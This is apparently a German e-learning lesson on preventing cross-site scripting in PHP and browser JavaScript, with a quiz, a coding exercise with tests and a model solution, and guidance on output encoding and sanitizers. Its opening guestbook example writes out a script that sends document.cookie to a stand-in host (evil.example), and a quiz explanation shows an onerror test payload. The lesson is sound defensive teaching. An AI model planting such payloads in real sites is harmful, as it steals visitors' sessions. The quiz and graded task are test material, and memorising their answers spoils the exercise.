---
title: XSS verhindern mit Output-Encoding
summary: Reflected, Stored und DOM-based XSS unterscheiden und jede Ausgabe passend zu ihrem Kontext kodieren – in PHP und im Browser.
duration: 25
sources:
  - title: OWASP Cheat Sheet – Cross Site Scripting Prevention
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
  - title: OWASP Cheat Sheet – DOM based XSS Prevention
    url: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
  - title: PHP Manual – htmlspecialchars
    url: https://www.php.net/manual/de/function.htmlspecialchars.php
  - title: MDN – Node.textContent
    url: https://developer.mozilla.org/de/docs/Web/API/Node/textContent
  - title: MDN – Element.innerHTML (Sicherheitshinweise)
    url: https://developer.mozilla.org/de/docs/Web/API/Element/innerHTML
quiz:
  - type: match
    question: Ordne jeder XSS-Art ihren typischen Ablauf zu.
    pairs:
      - { left: "Reflected XSS", right: "Die Eingabe aus der URL wird sofort in die Antwort gespiegelt" }
      - { left: "Stored XSS", right: "Der Schadcode wird gespeichert und allen späteren Besuchern ausgeliefert" }
      - { left: "DOM-based XSS", right: "JavaScript im Browser schreibt Daten aus der URL per innerHTML ins DOM" }
    explanation: >
      Alle drei führen fremdes JavaScript im Origin deiner Seite aus. Sie unterscheiden sich darin, wo die Daten
      herkommen und wo sie ungefiltert ins HTML gelangen.
  - type: find-bug
    question: In welcher Zeile entsteht eine XSS-Lücke?
    language: js
    code: |
      const params = new URLSearchParams(location.search);
      const name = params.get('name') ?? 'Gast';
      const titel = document.querySelector('#titel');
      titel.innerHTML = `Hallo ${name}!`;
      document.title = `Hallo ${name}`;
    bug_line: 4
    explanation: >
      `innerHTML` interpretiert den Text als HTML. Mit `?name=<img src=x onerror=alert(1)>` läuft Code. Richtig
      ist `titel.textContent = …`. `document.title` setzt nur Text und ist hier unkritisch.
  - type: single
    question: Welcher Aufruf kodiert einen Wert sicher für ein HTML-Attribut in einfachen Anführungszeichen?
    options:
      - "`strip_tags($wert)`"
      - "`htmlspecialchars($wert, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')`"
      - "`addslashes($wert)`"
      - "`urlencode($wert)`"
    answer: 1
    explanation: >
      Mit `ENT_QUOTES` werden auch `'` und `"` kodiert – ein Wert kann das Attribut dann nicht verlassen.
      `strip_tags` entfernt nur Tags und lässt Anführungszeichen stehen.
  - type: multiple
    question: Warum reicht Escaping allein nicht für Links wie `<a href="…">`, deren URL von Nutzern stammt?
    options:
      - "Weil `javascript:alert(1)` keine HTML-Sonderzeichen enthält und trotzdem Code ausführt."
      - "Weil der URL-Kontext ein eigenes Schema prüfen muss, z. B. nur `https:` erlauben."
      - "Weil `htmlspecialchars` Links immer zerstört."
    answers: [0, 1]
    explanation: >
      Escaping verhindert, dass der Wert aus dem Attribut ausbricht – es sagt aber nichts darüber, ob das Ziel
      gefährlich ist. Bei URLs prüfst du zusätzlich das Schema gegen eine Allowlist.
tasks:
  - id: kommentare-escapen
    type: code
    language: js
    title: Kommentare sicher als HTML ausgeben
    description: |
      Eine Kommentarliste wird als HTML-String gebaut. Schreibe zwei Funktionen:

      1. `escapeHtml(text)` ersetzt `&`, `<`, `>`, `"` und `'` durch `&amp;`, `&lt;`, `&gt;`, `&quot;` und `&#39;`.
         Achtung: `&` zuerst, sonst kodierst du deine eigenen Ersetzungen doppelt.
      2. `kommentarHtml(autor, text)` liefert `<li><strong>AUTOR</strong>: TEXT</li>` – beide Werte kodiert.
         Ist `autor` leer, steht dort `Anonym`.
    starter: |
      function escapeHtml(text) {
        return text;
      }

      function kommentarHtml(autor, text) {
        return `<li><strong>${autor}</strong>: ${text}</li>`;
      }
    tests:
      - name: Normaler Kommentar
        code: |
          assertEqual(kommentarHtml('Ada', 'Toller Kurs!'), '<li><strong>Ada</strong>: Toller Kurs!</li>')
      - name: Skript wird zu Text
        code: |
          assertEqual(kommentarHtml('Eve', '<script>alert(1)</script>'), '<li><strong>Eve</strong>: &lt;script&gt;alert(1)&lt;/script&gt;</li>')
      - name: Anführungszeichen und kaufmännisches Und
        code: assertEqual(escapeHtml(`"Tom" & 'Jerry'`), '&quot;Tom&quot; &amp; &#39;Jerry&#39;')
      - name: Leerer Autor wird zu Anonym
        code: |
          assertEqual(kommentarHtml('', 'Hi'), '<li><strong>Anonym</strong>: Hi</li>')
      - name: Bereits kodierter Text wird erneut kodiert
        code: assertEqual(escapeHtml('&lt;b&gt;'), '&amp;lt;b&amp;gt;')
    hints:
      - "Eine Kette von `replaceAll` reicht: `text.replaceAll('&', '&amp;').replaceAll('<', '&lt;')…`"
      - "Für den leeren Autor: `const name = autor === '' ? 'Anonym' : autor;`"
    solution: |
      function escapeHtml(text) {
        return String(text)
          .replaceAll('&', '&amp;')
          .replaceAll('<', '&lt;')
          .replaceAll('>', '&gt;')
          .replaceAll('"', '&quot;')
          .replaceAll("'", '&#39;');
      }

      function kommentarHtml(autor, text) {
        const name = autor === '' ? 'Anonym' : autor;
        return `<li><strong>${escapeHtml(name)}</strong>: ${escapeHtml(text)}</li>`;
      }
  - id: senken-sortieren
    type: dragdrop
    title: Sicher oder gefährlich?
    description: Der Wert `eingabe` stammt aus der URL. Ordne jede Zeile ein.
    targets:
      - { id: sicher, label: "Sicher – Wert bleibt Text" }
      - { id: gefaehrlich, label: "Gefährlich – Wert kann Code werden" }
    items:
      - { label: "el.textContent = eingabe", target: sicher }
      - { label: "el.innerHTML = eingabe", target: gefaehrlich }
      - { label: "input.value = eingabe", target: sicher }
      - { label: "document.write(eingabe)", target: gefaehrlich }
      - { label: "eval(eingabe)", target: gefaehrlich }
      - { label: "el.setAttribute('title', eingabe)", target: sicher }
      - { label: "link.href = eingabe (ohne Schema-Prüfung)", target: gefaehrlich }
      - { label: "React: <p>{eingabe}</p>", target: sicher }
    hints:
      - "Alles, was HTML oder JavaScript *interpretiert*, ist eine gefährliche Senke."
      - "`href` kann `javascript:` enthalten – ohne Prüfung des Schemas ist das gefährlich."
---
In einem Gästebuch schreibt jemand: `Schöne Seite! <script>fetch('https://evil.example/?c=' + document.cookie)</script>`.
Das Gästebuch speichert den Text und zeigt ihn jedem Besucher an. Ab jetzt läuft dieses Skript bei allen – mit
den Rechten deiner Seite.

## Was XSS anrichten kann

Bei [[xss|Cross-Site Scripting]] bringt jemand eigenes JavaScript dazu, im [[origin|Origin]] deiner Seite zu
laufen. Für den Browser ist das Skript dann echter Code deiner App.

Damit kann es:

- Inhalte der Seite lesen, etwa Namen, Adressen oder CSRF-Tokens,
- Anfragen im Namen der Nutzerin schicken (Passwort ändern, Bestellungen auslösen),
- die Seite verändern, z. B. ein falsches Login-Formular einblenden,
- Cookies stehlen, sofern sie nicht [[httponly|HttpOnly]] sind.

> [!MERKSATZ]
> XSS ist eine Injection in HTML oder JavaScript. Die Ursache ist immer dieselbe: Daten werden an einer Stelle
> ausgegeben, an der der Browser sie als Code interpretiert.

## Drei Arten von XSS

![Reflected, Stored und DOM-based XSS im Vergleich](/assets/websicherheit/xss-arten.svg)

| Art | Woher kommt der Code? | Wo wird er eingefügt? |
|---|---|---|
| [[reflected-xss\|Reflected XSS]] | aus der aktuellen URL oder dem Formular | vom Server direkt in die Antwort |
| [[stored-xss\|Stored XSS]] | aus der Datenbank (Kommentar, Profil) | vom Server bei jedem Abruf |
| [[dom-xss\|DOM-based XSS]] | aus URL, `localStorage`, `postMessage` | von JavaScript im Browser |

Stored XSS ist meist am gefährlichsten: Ein einziger Eintrag trifft alle Besucher – auch Admins.

## Output-Encoding nach Kontext

Die Hauptabwehr heißt [[output-encoding|Output-Encoding]]: Du wandelst Sonderzeichen **bei der Ausgabe** in
harmlose Darstellungen um, passend zum Ort, an dem sie landen.

| Kontext | Beispiel | Richtig |
|---|---|---|
| HTML-Text | `<p>WERT</p>` | `htmlspecialchars()` |
| HTML-Attribut (in Anführungszeichen) | `<input value="WERT">` | `htmlspecialchars()` mit `ENT_QUOTES` |
| URL-Parameter | `?q=WERT` | `rawurlencode()` |
| Link-Ziel | `<a href="WERT">` | Schema prüfen (`https:`), dann `htmlspecialchars()` |
| JavaScript-Daten | `<script>const d = WERT</script>` | `json_encode()` mit `JSON_HEX_TAG` – besser `data-*`-Attribut |

```php
function e(string $wert): string
{
    return htmlspecialchars($wert, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

echo '<p>' . e($kommentar) . '</p>';
```

> [!FEHLER]
> Daten **beim Speichern** kodieren statt bei der Ausgabe. Dann steht `&lt;` in der Datenbank, wird in JSON-APIs
> falsch angezeigt und vielleicht doppelt kodiert. Speichere Rohdaten, kodiere beim Ausgeben.

## DOM-based XSS: Senken im Browser

Bei DOM-based XSS ist der Server unschuldig. JavaScript liest einen Wert und schreibt ihn in eine gefährliche
[[sink|Senke]] – eine API, die Text als HTML oder Code ausführt.

| Gefährliche Senke | Sichere Alternative |
|---|---|
| `el.innerHTML = wert` | `el.textContent = wert` |
| `document.write(wert)` | DOM-Elemente mit `createElement` bauen |
| `eval(wert)`, `new Function(wert)` | `JSON.parse(wert)` |
| `a.href = wert` | Schema prüfen: `new URL(wert).protocol === 'https:'` |

```js
const name = new URLSearchParams(location.search).get('name') ?? 'Gast'
document.querySelector('#titel').textContent = `Hallo ${name}!`
```

Frameworks helfen: React und Blade (`{{ $wert }}`) kodieren automatisch. Gefährlich sind die bewussten
Ausnahmen `dangerouslySetInnerHTML` und `{!! $wert !!}`.

## Wenn HTML erlaubt sein muss

Manchmal sollen Nutzer formatieren dürfen, etwa in einem Editor. Dann reicht Kodieren nicht – du brauchst einen
[[html-sanitizer|HTML-Sanitizer]]. Er parst das HTML und behält nur erlaubte Tags und Attribute (Allowlist).

- Im Browser ist [DOMPurify](https://github.com/cure53/DOMPurify) der verbreitete Standard.
- Auf dem Server gibt es Pakete wie HTML Purifier oder `symfony/html-sanitizer`.
- Alternative: Markdown erlauben und mit einem sicheren Renderer ohne Roh-HTML ausgeben.

> [!PRAXIS]
> In Code-Reviews lohnt sich eine schnelle Suche nach `innerHTML`, `dangerouslySetInnerHTML`, `{!!` und `v-html`.
> Jede Fundstelle braucht eine Begründung, warum der Wert sicher ist.

## Zusammenfassung

- **XSS** lässt fremdes JavaScript im Origin deiner Seite laufen.
- **Reflected**, **Stored** und **DOM-based** XSS unterscheiden sich in Quelle und Einfügestelle.
- Hauptabwehr ist **Output-Encoding** passend zum Kontext: `htmlspecialchars()` mit `ENT_QUOTES`, `rawurlencode()`, Schema-Prüfung bei Links.
- Im Browser: `textContent` statt `innerHTML`, kein `eval`.
- Muss HTML erlaubt sein, filtert ein **Sanitizer** mit Allowlist.
